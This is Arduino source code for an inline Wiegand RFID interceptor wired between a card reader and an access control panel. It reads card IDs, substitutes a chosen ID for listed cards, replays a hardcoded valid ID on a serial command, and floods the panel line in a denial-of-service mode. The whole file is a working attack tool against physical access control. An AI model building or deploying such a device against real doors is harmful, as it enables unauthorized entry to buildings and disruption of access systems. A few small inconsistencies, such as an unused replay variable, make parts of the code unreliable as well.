/*
 * Wiegand RFID Reader/Emulator for Arduino Uno
 * - Reads Wiegand signals from RFID reader
 * - Maps IDs to different values (spoofing)
 * - Emulates Wiegand output signals
 */

#include <Arduino.h>

// ======================
// HARDWARE CONFIGURATION
// ======================
#define PIN_DATA0_IN 2      // D2 - INT0 for Wiegand DATA0 input (Green wire)
#define PIN_DATA1_IN 3      // D3 - INT1 for Wiegand DATA1 input (White wire)
#define PIN_DATA0_OUT 5     // D5 - Wiegand DATA0 output
#define PIN_DATA1_OUT 6     // D6 - Wiegand DATA1 output


/*
        ╔══════════════════╗                ╔══════════════════╗
        ║  RFID Reader     ║                ║  Access Control  ║
        ║ (Wiegand Reader) ║                ║                  ║
        ║                  ║                ║                  ║
        ║  VCC   o────────────┐           ┌───o VCC            ║
        ║  GND   o────────────┴───────────┴───o GND            ║
        ║  DATA0 o─────┐                  ┌───o DATA0          ║
        ║  DATA1 o─────┴────────┐     ┌───┴───o DATA1          ║
        ╚══════════════════╝    |     |     ╚══════════════════╝
                                |     |
                                |     | 
                             ╔════════════╗   
                             ║   ARDUINO  ║
                             ║     UNO    ║
    Green  (DATA0_IN) ─────▶ ║ D2      D5 ║  ─────▶ Green (DATA0_OUT)
    White  (DATA1_IN) ─────▶ ║ D3      D6 ║  ─────▶ White (DATA1_OUT)
                             ║            ║
                             ║            ║
    Power       (5V)  ─────▶ ║  5V    GND ║  ─────▶ GND
    Ground      (GND) ─────▶ ║ GND        ║
                             ╚════════════╝


    Left: RFID reader sending a Wiegand signal to the Arduino
    Middle: Arduino Uno reading, spoofing and/or sending a new ID
    Right: Access control to which Arduino can send "fake" tags

    All devices must have a common ground (GND).
    The Arduino sends output through pins D5 and D6, which go to the controller.
*/



// =================
// WIEGAND PROTOCOL
// =================
#define MAX_CARD_BITS 32      // Standard HID cards use 32-bit Wiegand format
#define PULSE_WIDTH 100       // Pulse duration in microseconds (100µs typical)
#define PULSE_INTERVAL 2000   // Time between bits in microseconds (2ms typical)
#define RECEIVE_TIMEOUT 25    // Timeout after last pulse in milliseconds


// =====================
// CONTROL FLAGS
// =====================
bool replayAttack = false;        // Set to true to trigger replay attack
bool dosMode = false;             // Set to true to enable DoS attack
unsigned long dosStartTime = 0;




// ============================
// ATTACK CONFIGURATION
// ============================

// A value used in a DoS attack (eg noise, wrong ID)
const uint32_t DOS_ATTACK_VALUE = 0xFFFFFFFF;

// Value used for Replay attack (valid replay ID)
const uint32_t REPLAY_ATTACK_ID = 0x3573A6;

// If 0 → infinite; If, for example, 5000 → lasts 5 seconds
#define DOS_DURATION_MS 5000




// =======================
// SPOOFING CONFIGURATION
// =======================

// Maximum number of spoofed cards
#define MAX_SPOOF_IDS 100

// Dynamic list of spoofed original IDs
uint32_t spoofedOriginals[MAX_SPOOF_IDS] = {
  3123646737,
  4207455661,
  2813628560
};

// Number of spoof IDs (calculated automatically)
uint8_t spoofedIdCount = sizeof(spoofedOriginals) / sizeof(spoofedOriginals[0]);

// Target spoof ID
uint32_t spoofTargetId = 3503014;








// =================
// GLOBAL VARIABLES
// =================
volatile char tagData[MAX_CARD_BITS];     // Buffer for storing received bits
volatile byte tagIndex = 0;               // Current position in buffer
volatile bool receivingData = false;      // Flag set during data reception
volatile unsigned long lastPulseTime = 0; // Timestamp of last received pulse
unsigned long tagInt = 0;                 // Numeric representation of tag





// =====================
// INTERRUPT HANDLERS
// =====================
// Called when DATA0 line goes low (bit '0')
void readData0() {
  receivingData = true;
  lastPulseTime = millis();           // Update last received pulse time
  if(tagIndex < MAX_CARD_BITS) {
    tagData[tagIndex++] = '0';        // Store '0' bit
  }
}

// Called when DATA1 line goes low (bit '1')
void readData1() {
  receivingData = true;
  lastPulseTime = millis();           // Update last received pulse time
  if(tagIndex < MAX_CARD_BITS) {
    tagData[tagIndex++] = '1';        // Store '1' bit
  }
}




// ==========================
// SPOOFING ATTACK
// ==========================
// Returns the spoofed ID if it is in the spoofed list
uint32_t getSpoofedId(uint32_t originalId) {
  for (uint8_t i = 0; i < spoofedIdCount; i++) {
    if (spoofedOriginals[i] == originalId) {
      Serial.print("Spoofing ID: 0x");
      Serial.print(originalId, HEX);
      Serial.print(" => 0x");
      Serial.println(spoofTargetId, HEX);
      return spoofTargetId;
    }
  }
  return originalId;            // If not in the list, returns the original
}






// =====================
// REPLAY ATTACK HANDLER
// =====================
// Simulates re-transmitting a known valid card ID
void triggerReplayAttack() {
  if (!replayAttack) return;            // Do nothing if not in replay mode

  Serial.println("\nPerforming Replay Attack!");

  uint32_t replayId = 8139252;          // Predefined spoofed/replayed ID
  emulateWiegand(REPLAY_ATTACK_ID);     // Send the ID over Wiegand interface

  Serial.print("Sending: ");
  Serial.println(REPLAY_ATTACK_ID);

  replayAttack = false;                 // Reset flag after one-time use
}




// =============================
// DENIAL-OF-SERVICE ATTACK MODE
// =============================
// Continuously spams the line with invalid data if dosMode is enabled
void triggerDosAttack() {
  if (!dosMode) return;      // Do nothing if not in DoS mode

  Serial.println("Performing DoS Attack!");

  // Send invalid/spam data (e.g., 0xFFFFFFFF or random noise)
  emulateWiegand(DOS_ATTACK_VALUE);

  // Add delay to avoid overwhelming system
  delay(500);                // Optional: tweak or remove based on behavior
}









// =====================
// MAIN ARDUINO FUNCTIONS
// =====================
void setup() {
  Serial.begin(115200); // Initialize serial communication
  
  // Configure input pins with pullups
  pinMode(PIN_DATA0_IN, INPUT_PULLUP);
  pinMode(PIN_DATA1_IN, INPUT_PULLUP);
  
  // Configure output pins
  pinMode(PIN_DATA0_OUT, OUTPUT);
  pinMode(PIN_DATA1_OUT, OUTPUT);
  
  // Set output lines to idle state (HIGH)
  digitalWrite(PIN_DATA0_OUT, HIGH);
  digitalWrite(PIN_DATA1_OUT, HIGH);
  
  // Attach interrupts to input pins
  attachInterrupt(digitalPinToInterrupt(PIN_DATA0_IN), readData0, FALLING);
  attachInterrupt(digitalPinToInterrupt(PIN_DATA1_IN), readData1, FALLING);
  
  Serial.println("\nWiegand RFID Reader/Emulator Ready");
}

void loop() {
  // Check if we have received data and timeout period has passed
  if(receivingData && (millis() - lastPulseTime > RECEIVE_TIMEOUT)) {

    processTag();           // Process the received tag
    receivingData = false;  // Reset reception flag
    tagIndex = 0;           // Reset buffer position
  }


  // === Serial command ===
  if (Serial.available()) {
    String input = Serial.readStringUntil('\n');  // Reads the entire line
    input.trim();                                 // Remove spaces and newlines
    input.toLowerCase();                          // Convert to lowercase

    if (input == "d" || input == "dos" || input == "dosattack") {
      dosMode = !dosMode;
      if (dosMode) {
        dosStartTime = millis();
        Serial.println("\nDoS attack ENABLED");
      } else {
        Serial.println("\nDoS attack DISABLED");
      }
    } else if (input == "r" || input == "replay" || input == "replayattack") {
      replayAttack = true;
      Serial.println("\nReplay attack TRIGGERED");
    } else {
      Serial.print("\n⚠️ Unknown command: ");
      Serial.println(input);
    }
  }

  // === Replay Attack (one-time) ===
  triggerReplayAttack();

  // === DoS Attack (continuous) ===
  if (dosMode) {
    triggerDosAttack();

    // If it is time-limited (DOS_DURATION_MS > 0)
    if (DOS_DURATION_MS > 0 && (millis() - dosStartTime > DOS_DURATION_MS)) {
      dosMode = false;
      Serial.println("\nDoS attack timed out");
    }
  }

}

// =====================
// TAG PROCESSING
// =====================
void processTag() {

  // Convert the received binary string to a number
  uint32_t numericValue = 0;
  for (int i = 0; i < tagIndex; i++) {
    numericValue = (numericValue << 1) | (tagData[i] == '1' ? 1 : 0);
  }
  tagInt = numericValue;

  // IGNORE empty, short or null IDs
  if (tagInt == 0 || tagIndex < 26) {
    Serial.println("⚠️ Invalid or empty tag. Ignoring...");
    return;
  }

  // Prints received binary string
  Serial.print("\nReceived: ");
  for (int i = 0; i < tagIndex; i++) {
    Serial.print(tagData[i]);
  }

  // Print decimal and hex
  Serial.print(" (DEC: ");
  Serial.print(tagInt);
  Serial.print(" | HEX: 0x");
  Serial.print(tagInt, HEX);
  Serial.println(")");

  // Spoofing ID if necessary
  uint32_t outputId = getSpoofedId(tagInt);

  // Print spoof ID (if applied)
  Serial.print("Sending: ");
  Serial.print(outputId);
  Serial.print(" (HEX: 0x");
  Serial.print(outputId, HEX);
  Serial.println(")");

  // Output emulation
  emulateWiegand(outputId);
}


// =====================
// WIEGAND EMULATION
// =====================
void emulateWiegand(unsigned long data) {

  // We must use uint32_t instead of unsigned long for 32-bit values
  uint32_t value = (uint32_t)data;


  // Send each bit starting with the MSB (most significant bit)
  for(int i=MAX_CARD_BITS-1; i>=0; i--) {
    bool bit = (value >> i) & 1; // Extract current bit
    
    if(bit) {
      // Send '1' by pulsing DATA1 line
      digitalWrite(PIN_DATA1_OUT, LOW);
      delayMicroseconds(PULSE_WIDTH);
      digitalWrite(PIN_DATA1_OUT, HIGH);
    } else {
      // Send '0' by pulsing DATA0 line
      digitalWrite(PIN_DATA0_OUT, LOW);
      delayMicroseconds(PULSE_WIDTH);
      digitalWrite(PIN_DATA0_OUT, HIGH);
    }
    
    // Maintain timing between bits
    delayMicroseconds(PULSE_INTERVAL);
  }

}
